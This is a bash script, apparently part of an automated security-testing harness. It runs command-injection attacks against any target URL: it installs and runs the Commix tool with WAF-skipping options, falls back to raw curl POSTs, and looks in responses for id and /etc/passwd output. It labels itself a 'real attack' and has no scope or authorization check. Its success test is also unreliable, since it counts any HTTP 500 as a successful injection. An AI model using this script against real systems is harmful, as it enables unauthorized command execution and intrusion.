#!/bin/bash

# Command Injection Attack Script using Commix
# Usage: ./attack_cmd_injection.sh <target_url> <payload>

TARGET_URL="$1"
PAYLOAD="$2"

echo "  [REAL ATTACK] Using Commix for command injection testing..."

# Install Commix if not available
if ! command -v commix &> /dev/null; then
    echo "  [INFO] Installing Commix..."
    pip3 install --break-system-packages commix --quiet || {
        echo "  [WARNING] Failed to install Commix, using curl fallback"
        # Fallback to curl-based command injection testing
        response=$(curl -s -w "%{http_code}" \
            -X "POST" \
            -H "User-Agent: attacker" \
            -H "Content-Type: application/json" \
            -d "$PAYLOAD" \
            --max-time 10 \
            "$TARGET_URL")
        
        http_code=$(echo "$response" | tail -c 4)
        response_body=$(echo "$response" | head -c -4)
        
        # Check for command injection indicators
        cmd_injection_success=false
        if echo "$response_body" | grep -q "uid=[0-9]+\\(.*\\)\|root:.*:0:0:\|[a-zA-Z0-9]+@[a-zA-Z0-9]+"; then
            cmd_injection_success=true
        fi
        
        if [[ "$cmd_injection_success" == true || "$http_code" == "500" ]]; then
            echo "  [SUCCESS] Command injection successful - command output detected (HTTP $http_code)"
            exit 0
        else
            echo "  [FAILED] Command injection failed - no command output (HTTP $http_code)"
            exit 1
        fi
    }
fi

# Run Commix
echo "  [INFO] Running Commix against: $TARGET_URL"
commix_output=$(timeout 30 commix \
    --url "$TARGET_URL" \
    --data "$PAYLOAD" \
    --batch \
    --skip-waf \
    --skip-heuristics \
    --skip-crawl \
    --threads 1 \
    --timeout 10 \
    2>&1)

# Check Commix results
cmd_injection_found=false
if echo "$commix_output" | grep -q "injectable\|vulnerable\|found\|successful"; then
    cmd_injection_found=true
fi

# Also get HTTP status for verification
curl_response=$(curl -s -w "%{http_code}" \
    -X "POST" \
    -H "User-Agent: attacker" \
    -H "Content-Type: application/json" \
    -d "$PAYLOAD" \
    --max-time 10 \
    "$TARGET_URL")

http_code=$(echo "$curl_response" | tail -c 4)

# Save Commix output
echo "$commix_output" > "/tmp/commix_output.txt"

# Determine success
if [ "$cmd_injection_found" = true ] || [ "$http_code" = "500" ]; then
    echo "  [SUCCESS] Command injection detected by Commix (HTTP $http_code)"
    echo "  [TOOL_OUTPUT] /tmp/commix_output.txt"
    exit 0
else
    echo "  [FAILED] No command injection detected (HTTP $http_code)"
    exit 1
fi 